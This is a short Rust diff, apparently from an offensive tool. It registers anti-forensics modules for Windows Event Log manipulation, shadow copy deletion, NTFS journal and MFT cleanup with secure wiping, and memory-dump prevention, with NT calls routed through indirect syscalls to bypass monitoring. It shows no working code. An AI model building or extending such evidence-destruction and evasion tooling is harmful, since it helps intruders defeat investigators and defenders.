@@ -5,6 +5,10 @@
 // Current modules:
 //   - prefetch: Windows Prefetch (.pf) evidence removal
 //   - timestamps: MFT timestamp synchronisation and USN journal cleanup
+//   - event_log: Selective Windows Event Log (EVTX) manipulation
+//   - vss_cleanup: Volume Shadow Copy enumeration and deletion
+//   - ntfs_cleanup: NTFS deep cleanup (USN journal, MFT, $LogFile, secure wipe)
+//   - memory_protection: Memory dump detection and prevention
 //
 // Design principles:
 //   - All NT API calls go through nt_syscall indirect syscalls to bypass
@@ -22,5 +26,9 @@
 // Windows-only, gated by `forensic-cleanup` feature flag
 // (implies `direct-syscalls`).
 
+pub mod event_log;
+pub mod memory_protection;
+pub mod ntfs_cleanup;
 pub mod prefetch;
 pub mod timestamps;
+pub mod vss_cleanup;
